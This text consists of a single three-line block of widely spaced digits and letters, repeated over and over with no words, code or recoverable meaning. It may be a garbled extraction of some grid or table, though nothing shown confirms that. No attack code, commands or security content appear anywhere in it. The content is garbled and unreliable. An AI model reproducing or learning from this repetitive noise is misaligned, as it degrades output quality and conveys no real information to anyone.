1  4   7   8   8   9  0 b  9 5 d 0  9  4   8 s 8   2  80    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   
a   v    d     a   u    k   i     j   u     y   i   j  s   r   5   k
1  4   7   8   8   9  0 b  9 5 d 0  9  4   8 s 8   2  80    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   
a   v    d     a   u    k   i     j   u     y   i   j  s   r   5   k
1  4   7   8   8   9  0 b  9 5 d 0  9  4   8 s 8   2  80    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   
a   v    d     a   u    k   i     j   u     y   i   j  s   r   5   k
1  4   7   8   8   9  0 b  9 5 d 0  9  4   8 s 8   2  80    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   
a   v    d     a   u    k   i     j   u     y   i   j  s   r   5   k
1  4   7   8   8   9  0 b  9 5 d 0  9  4   8 s 8   2  80    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   
a   v    d     a   u    k   i     j   u     y   i   j  s   r   5   k
1  4   7   8   8   9  0 b  9 5 d 0  9  4   8 s 8   2  80    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   
a   v    d     a   u    k   i     j   u     y   i   j  s   r   5   k
1  4   7   8   8   9  0 b  9 5 d 0  9  4   8 s 8   2  80    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   
a   v    d     a   u    k   i     j   u     y   i   j  s   r   5   k
1  4   7   8   8   9  0 b  9 5 d 0  9  4   8 s 8   2  80    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   
a   v    d     a   u    k   i     j   u     y   i   j  s   r   5   k
1  4   7   8   8   9  0 b  9 5 d 0  9  4   8 s 8   2  80    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   
a   v    d     a   u    k   i     j   u     y   i   j  s   r   5   k
1  4   7   8   8   9  0 b  9 5 d 0  9  4   8 s 8   2  80    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   
a   v    d     a   u    k   i     j   u     y   i   j  s   r   5   k
1  4   7   8   8   9  0 b  9 5 d 0  9  4   8 s 8   2  80    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   
a   v    d     a   u    k   i     j   u     y   i   j  s   r   5   k
1  4   7   8   8   9  0 b  9 5 d 0  9  4   8 s 8   2  80    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   
a   v    d     a   u    k   i     j   u     y   i   j  s   r   5   k
1  4   7   8   8   9  0 b  9 5 d 0  9  4   8 s 8   2  80    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   
a   v    d     a   u    k   i     j   u     y   i   j  s   r   5   k
1  4   7   8   8   9  0 b  9 5 d 0  9  4   8 s 8   2  80    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   
a   v    d     a   u    k   i     j   u     y   i   j  s   r   5   k
1  4   7   8   8   9  0 b  9 5 d 0  9  4   8 s 8   2  80    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   
a   v    d     a   u    k   i     j   u     y   i   j  s   r   5   k
1  4   7   8   8   9  0 b  9 5 d 0  9  4   8 s 8   2  80    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   
a   v    d     a   u    k   i     j   u     y   i   j  s   r   5   k
1  4   7   8   8   9  0 b  9 5 d 0  9  4   8 s 8   2  80    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   
a   v    d     a   u    k   i     j   u     y   i   j  s   r   5   k
1  4   7   8   8   9  0 b  9 5 d 0  9  4   8 s 8   2  80    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   
a   v    d     a   u    k   i     j   u     y   i   j  s   r   5   k
1  4   7   8   8   9  0 b  9 5 d 0  9  4   8 s 8   2  80    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   
a   v    d     a   u    k   i     j   u     y   i   j  s   r   5   k
1  4   7   8   8   9  0 b  9 5 d 0  9  4   8 s 8   2  80    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   
a   v    d     a   u    k   i     j   u     y   i   j  s   r   5   k
1  4   7   8   8   9  0 b  9 5 d 0  9  4   8 s 8   2  80    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   
a   v    d     a   u    k   i     j   u     y   i   j  s   r   5   k
1  4   7   8   8   9  0 b  9 5 d 0  9  4   8 s 8   2  80    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   
a   v    d     a   u    k   i     j   u     y   i   j  s   r   5   k
1  4   7   8   8   9  0 b  9 5 d 0  9  4   8 s 8   2  80    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   
a   v    d     a   u    k   i     j   u     y   i   j  s   r   5   k
1  4   7   8   8   9  0 b  9 5 d 0  9  4   8 s 8   2  80    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   
a   v    d     a   u    k   i     j   u     y   i   j  s   r   5   k
1  4   7   8   8   9  0 b  9 5 d 0  9  4   8 s 8   2  80    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   
a   v    d     a   u    k   i     j   u     y   i   j  s   r   5   k
1  4   7   8   8   9  0 b  9 5 d 0  9  4   8 s 8   2  80    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   
a   v    d     a   u    k   i     j   u     y   i   j  s   r   5   k
1  4   7   8   8   9  0 b  9 5 d 0  9  4   8 s 8   2  80    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   
a   v    d     a   u    k   i     j   u     y   i   j  s   r   5   k
1  4   7   8   8   9  0 b  9 5 d 0  9  4   8 s 8   2  80    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   
a   v    d     a   u    k   i     j   u     y   i   j  s   r   5   k
1  4   7   8   8   9  0 b  9 5 d 0  9  4   8 s 8   2  80    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   
a   v    d     a   u    k   i     j   u     y   i   j  s   r   5   k
1  4   7   8   8   9  0 b  9 5 d 0  9  4   8 s 8   2  80    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   
a   v    d     a   u    k   i     j   u     y   i   j  s   r   5   k
1  4   7   8   8   9  0 b  9 5 d 0  9  4   8 s 8   2  80    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   
a   v    d     a   u    k   i     j   u     y   i   j  s   r   5   k
1  4   7   8   8   9  0 b  9 5 d 0  9  4   8 s 8   2  80    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   
a   v    d     a   u    k   i     j   u     y   i   j  s   r   5   k
1  4   7   8   8   9  0 b  9 5 d 0  9  4   8 s 8   2  80    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   
a   v    d     a   u    k   i     j   u     y   i   j  s   r   5   k
1  4   7   8   8   9  0 b  9 5 d 0  9  4   8 s 8   2  80    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   
a   v    d     a   u    k   i     j   u     y   i   j  s   r   5   k
1  4   7   8   8   9  0 b  9 5 d 0  9  4   8 s 8   2  80    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   
a   v    d     a   u    k   i     j   u     y   i   j  s   r   5   k
1  4   7   8   8   9  0 b  9 5 d 0  9  4   8 s 8   2  80    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   
a   v    d     a   u    k   i     j   u     y   i   j  s   r   5   k
1  4   7   8   8   9  0 b  9 5 d 0  9  4   8 s 8   2  80    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   
a   v    d     a   u    k   i     j   u     y   i   j  s   r   5   k
1  4   7   8   8   9  0 b  9 5 d 0  9  4   8 s 8   2  80    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   
a   v    d     a   u    k   i     j   u     y   i   j  s   r   5   k
1  4   7   8   8   9  0 b  9 5 d 0  9  4   8 s 8   2  80    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   
a   v    d     a   u    k   i     j   u     y   i   j  s   r   5   k
1  4   7   8   8   9  0 b  9 5 d 0  9  4   8 s 8   2  80    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   
a   v    d     a   u    k   i     j   u     y   i   j  s   r   5   k
1  4   7   8   8   9  0 b  9 5 d 0  9  4   8 s 8   2  80    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   
a   v    d     a   u    k   i     j   u     y   i   j  s   r   5   k
1  4   7   8   8   9  0 b  9 5 d 0  9  4   8 s 8   2  80    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   
a   v    d     a   u    k   i     j   u     y   i   j  s   r   5   k
1  4   7   8   8   9  0 b  9 5 d 0  9  4   8 s 8   2  80    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   
a   v    d     a   u    k   i     j   u     y   i   j  s   r   5   k
1  4   7   8   8   9  0 b  9 5 d 0  9  4   8 s 8   2  80    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   
a   v    d     a   u    k   i     j   u     y   i   j  s   r   5   k
1  4   7   8   8   9  0 b  9 5 d 0  9  4   8 s 8   2  80    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   
a   v    d     a   u    k   i     j   u     y   i   j  s   r   5   k
1  4   7   8   8   9  0 b  9 5 d 0  9  4   8 s 8   2  80    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   
a   v    d     a   u    k   i     j   u     y   i   j  s   r   5   k
1  4   7   8   8   9  0 b  9 5 d 0  9  4   8 s 8   2  80    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   
a   v    d     a   u    k   i     j   u     y   i   j  s   r   5   k
1  4   7   8   8   9  0 b  9 5 d 0  9  4   8 s 8   2  80    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   
a   v    d     a   u    k   i     j   u     y   i   j  s   r   5   k
1  4   7   8   8   9  0 b  9 5 d 0  9  4   8 s 8   2  80    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   
a   v    d     a   u    k   i     j   u     y   i   j  s   r   5   k
1  4   7   8   8   9  0 b  9 5 d 0  9  4   8 s 8   2  80    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   
a   v    d     a   u    k   i     j   u     y   i   j  s   r   5   k
1  4   7   8   8   9  0 b  9 5 d 0  9  4   8 s 8   2  80    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   
a   v    d     a   u    k   i     j   u     y   i   j  s   r   5   k
1  4   7   8   8   9  0 b  9 5 d 0  9  4   8 s 8   2  80    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   
a   v    d     a   u    k   i     j   u     y   i   j  s   r   5   k
1  4   7   8   8   9  0 b  9 5 d 0  9  4   8 s 8   2  80    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   
a   v    d     a   u    k   i     j   u     y   i   j  s   r   5   k
1  4   7   8   8   9  0 b  9 5 d 0  9  4   8 s 8   2  80    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   
a   v    d     a   u    k   i     j   u     y   i   j  s   r   5   k
1  4   7   8   8   9  0 b  9 5 d 0  9  4   8 s 8   2  80    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   
a   v    d     a   u    k   i     j   u     y   i   j  s   r   5   k
1  4   7   8   8   9  0 b  9 5 d 0  9  4   8 s 8   2  80    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   
a   v    d     a   u    k   i     j   u     y   i   j  s   r   5   k
1  4   7   8   8   9  0 b  9 5 d 0  9  4   8 s 8   2  80    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   
a   v    d     a   u    k   i     j   u     y   i   j  s   r   5   k
1  4   7   8   8   9  0 b  9 5 d 0  9  4   8 s 8   2  80    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   
a   v    d     a   u    k   i     j   u     y   i   j  s   r   5   k
1  4   7   8   8   9  0 b  9 5 d 0  9  4   8 s 8   2  80    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   
a   v    d     a   u    k   i     j   u     y   i   j  s   r   5   k
1  4   7   8   8   9  0 b  9 5 d 0  9  4   8 s 8   2  80    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   
a   v    d     a   u    k   i     j   u     y   i   j  s   r   5   k
1  4   7   8   8   9  0 b  9 5 d 0  9  4   8 s 8   2  80    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   
a   v    d     a   u    k   i     j   u     y   i   j  s   r   5   k
1  4   7   8   8   9  0 b  9 5 d 0  9  4   8 s 8   2  80    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   
a   v    d     a   u    k   i     j   u     y   i   j  s   r   5   k
1  4   7   8   8   9  0 b  9 5 d 0  9  4   8 s 8   2  80    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   
a   v    d     a   u    k   i     j   u     y   i   j  s   r   5   k
1  4   7   8   8   9  0 b  9 5 d 0  9  4   8 s 8   2  80    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   
a   v    d     a   u    k   i     j   u     y   i   j  s   r   5   k
1  4   7   8   8   9  0 b  9 5 d 0  9  4   8 s 8   2  80    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   
a   v    d     a   u    k   i     j   u     y   i   j  s   r   5   k
1  4   7   8   8   9  0 b  9 5 d 0  9  4   8 s 8   2  80    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   
a   v    d     a   u    k   i     j   u     y   i   j  s   r   5   k
1  4   7   8   8   9  0 b  9 5 d 0  9  4   8 s 8   2  80    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   
a   v    d     a   u    k   i     j   u     y   i   j  s   r   5   k
1  4   7   8   8   9  0 b  9 5 d 0  9  4   8 s 8   2  80    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   
a   v    d     a   u    k   i     j   u     y   i   j  s   r   5   k
1  4   7   8   8   9  0 b  9 5 d 0  9  4   8 s 8   2  80    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   
a   v    d     a   u    k   i     j   u     y   i   j  s   r   5   k
1  4   7   8   8   9  0 b  9 5 d 0  9  4   8 s 8   2  80    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   
a   v    d     a   u    k   i     j   u     y   i   j  s   r   5   k
1  4   7   8   8   9  0 b  9 5 d 0  9  4   8 s 8   2  80    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   
a   v    d     a   u    k   i     j   u     y   i   j  s   r   5   k
1  4   7   8   8   9  0 b  9 5 d 0  9  4   8 s 8   2  80    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   
a   v    d     a   u    k   i     j   u     y   i   j  s   r   5   k
1  4   7   8   8   9  0 b  9 5 d 0  9  4   8 s 8   2  80    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   
a   v    d     a   u    k   i     j   u     y   i   j  s   r   5   k
1  4   7   8   8   9  0 b  9 5 d 0  9  4   8 s 8   2  80    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   
a   v    d     a   u    k   i     j   u     y   i   j  s   r   5   k
1  4   7   8   8   9  0 b  9 5 d 0  9  4   8 s 8   2  80    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   
a   v    d     a   u    k   i     j   u     y   i   j  s   r   5   k
1  4   7   8   8   9  0 b  9 5 d 0  9  4   8 s 8   2  80    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   
a   v    d     a   u    k   i     j   u     y   i   j  s   r   5   k
1  4   7   8   8   9  0 b  9 5 d 0  9  4   8 s 8   2  80    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   
a   v    d     a   u    k   i     j   u     y   i   j  s   r   5   k
1  4   7   8   8   9  0 b  9 5 d 0  9  4   8 s 8   2  80    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   
a   v    d     a   u    k   i     j   u     y   i   j  s   r   5   k
1  4   7   8   8   9  0 b  9 5 d 0  9  4   8 s 8   2  80    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   
a   v    d     a   u    k   i     j   u     y   i   j  s   r   5   k
1  4   7   8   8   9  0 b  9 5 d 0  9  4   8 s 8   2  80    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   
a   v    d     a   u    k   i     j   u     y   i   j  s   r   5   k
1  4   7   8   8   9  0 b  9 5 d 0  9  4   8 s 8   2  80    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   
a   v    d     a   u    k   i     j   u     y   i   j  s   r   5   k
1  4   7   8   8   9  0 b  9 5 d 0  9  4   8 s 8   2  80    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   
a   v    d     a   u    k   i     j   u     y   i   j  s   r   5   k
1  4   7   8   8   9  0 b  9 5 d 0  9  4   8 s 8   2  80    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   
a   v    d     a   u    k   i     j   u     y   i   j  s   r   5   k
1  4   7   8   8   9  0 b  9 5 d 0  9  4   8 s 8   2  80    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   
a   v    d     a   u    k   i     j   u     y   i   j  s   r   5   k
1  4   7   8   8   9  0 b  9 5 d 0  9  4   8 s 8   2  80    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   
a   v    d     a   u    k   i     j   u     y   i   j  s   r   5   k
1  4   7   8   8   9  0 b  9 5 d 0  9  4   8 s 8   2  80    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   
a   v    d     a   u    k   i     j   u     y   i   j  s   r   5   k
1  4   7   8   8   9  0 b  9 5 d 0  9  4   8 s 8   2  80    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   
a   v    d     a   u    k   i     j   u     y   i   j  s   r   5   k
1  4   7   8   8   9  0 b  9 5 d 0  9  4   8 s 8   2  80    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   
a   v    d     a   u    k   i     j   u     y   i   j  s   r   5   k
1  4   7   8   8   9  0 b  9 5 d 0  9  4   8 s 8   2  80    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   
a   v    d     a   u    k   i     j   u     y   i   j  s   r   5   k
1  4   7   8   8   9  0 b  9 5 d 0  9  4   8 s 8   2  80    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   
a   v    d     a   u    k   i     j   u     y   i   j  s   r   5   k
1  4   7   8   8   9  0 b  9 5 d 0  9  4   8 s 8   2  80    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   
a   v    d     a   u    k   i     j   u     y   i   j  s   r   5   k
1  4   7   8   8   9  0 b  9 5 d 0  9  4   8 s 8   2  80    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   
a   v    d     a   u    k   i     j   u     y   i   j  s   r   5   k
1  4   7   8   8   9  0 b  9 5 d 0  9  4   8 s 8   2  80    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   
a   v    d     a   u    k   i     j   u     y   i   j  s   r   5   k
1  4   7   8   8   9  0 b  9 5 d 0  9  4   8 s 8   2  80    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   
a   v    d     a   u    k   i     j   u     y   i   j  s   r   5   k
1  4   7   8   8   9  0 b  9 5 d 0  9  4   8 s 8   2  80    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   
a   v    d     a   u    k   i     j   u     y   i   j  s   r   5   k
1  4   7   8   8   9  0 b  9 5 d 0  9  4   8 s 8   2  80    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   
a   v    d     a   u    k   i     j   u     y   i   j  s   r   5   k
1  4   7   8   8   9  0 b  9 5 d 0  9  4   8 s 8   2  80    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   
a   v    d     a   u    k   i     j   u     y   i   j  s   r   5   k
1  4   7   8   8   9  0 b  9 5 d 0  9  4   8 s 8   2  80    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   
a   v    d     a   u    k   i     j   u     y   i   j  s   r   5   k
1  4   7   8   8   9  0 b  9 5 d 0  9  4   8 s 8   2  80    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   
a   v    d     a   u    k   i     j   u     y   i   j  s   r   5   k
1  4   7   8   8   9  0 b  9 5 d 0  9  4   8 s 8   2  80    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   
a   v    d     a   u    k   i     j   u     y   i   j  s   r   5   k
1  4   7   8   8   9  0 b  9 5 d 0  9  4   8 s 8   2  80    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   
a   v    d     a   u    k   i     j   u     y   i   j  s   r   5   k
1  4   7   8   8   9  0 b  9 5 d 0  9  4   8 s 8   2  80    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   
a   v    d     a   u    k   i     j   u     y   i   j  s   r   5   k
1  4   7   8   8   9  0 b  9 5 d 0  9  4   8 s 8   2  80    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   
a   v    d     a   u    k   i     j   u     y   i   j  s   r   5   k
1  4   7   8   8   9  0 b  9 5 d 0  9  4   8 s 8   2  80    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   
a   v    d     a   u    k   i     j   u     y   i   j  s   r   5   k
1  4   7   8   8   9  0 b  9 5 d 0  9  4   8 s 8   2  80    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   
a   v    d     a   u    k   i     j   u     y   i   j  s   r   5   k
1  4   7   8   8   9  0 b  9 5 d 0  9  4   8 s 8   2  80    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   
a   v    d     a   u    k   i     j   u     y   i   j  s   r   5   k
1  4   7   8   8   9  0 b  9 5 d 0  9  4   8 s 8   2  80    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   
a   v    d     a   u    k   i     j   u     y   i   j  s   r   5   k
1  4   7   8   8   9  0 b  9 5 d 0  9  4   8 s 8   2  80    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   
a   v    d     a   u    k   i     j   u     y   i   j  s   r   5   k
1  4   7   8   8   9  0 b  9 5 d 0  9  4   8 s 8   2  80    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   
a   v    d     a   u    k   i     j   u     y   i   j  s   r   5   k
1  4   7   8   8   9  0 b  9 5 d 0  9  4   8 s 8   2  80    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   
a   v    d     a   u    k   i     j   u     y   i   j  s   r   5   k
1  4   7   8   8   9  0 b  9 5 d 0  9  4   8 s 8   2  80    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   
a   v    d     a   u    k   i     j   u     y   i   j  s   r   5   k
1  4   7   8   8   9  0 b  9 5 d 0  9  4   8 s 8   2  80    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   
a   v    d     a   u    k   i     j   u     y   i   j  s   r   5   k
1  4   7   8   8   9  0 b  9 5 d 0  9  4   8 s 8   2  80    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   
a   v    d     a   u    k   i     j   u     y   i   j  s   r   5   k
1  4   7   8   8   9  0 b  9 5 d 0  9  4   8 s 8   2  80    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   
a   v    d     a   u    k   i     j   u     y   i   j  s   r   5   k
1  4   7   8   8   9  0 b  9 5 d 0  9  4   8 s 8   2  80    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   
a   v    d     a   u    k   i     j   u     y   i   j  s   r   5   k
1  4   7   8   8   9  0 b  9 5 d 0  9  4   8 s 8   2  80    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   
a   v    d     a   u    k   i     j   u     y   i   j  s   r   5   k
